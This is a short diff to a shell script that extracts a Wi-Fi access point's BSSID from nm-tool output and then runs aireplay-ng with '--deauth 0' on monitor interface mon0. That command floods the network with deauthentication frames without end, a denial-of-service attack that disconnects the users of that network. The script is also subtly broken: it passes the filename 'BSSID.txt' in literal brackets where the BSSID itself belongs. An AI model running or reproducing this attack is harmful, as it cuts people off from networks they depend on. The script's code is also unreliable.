@@ -23,10 +23,13 @@
 nm-tool | grep \* > output1.txt
 
 sed -e '1d' output1.txt > output2.txt
-sed 's/............................//' output2.txt > output3.txt
-sed -r 's/.{42}$//' output3.txt > BSSID.txt
-rm output1.txt output2.txt output3.txt
+sed 's/.*Infra, //' output2.txt > output3.txt
+sed 's/\,.*/,/' output3.txt > output4.txt
+sed -r 's/.{1}$//' output4.txt > BSSID.txt
+rm output1.txt output2.txt output3.txt output4.txt
 
 BSSID="BSSID.txt"
 
 aireplay-ng --deauth 0 -a [$BSSID] mon0
+
+rm BSSID.txt
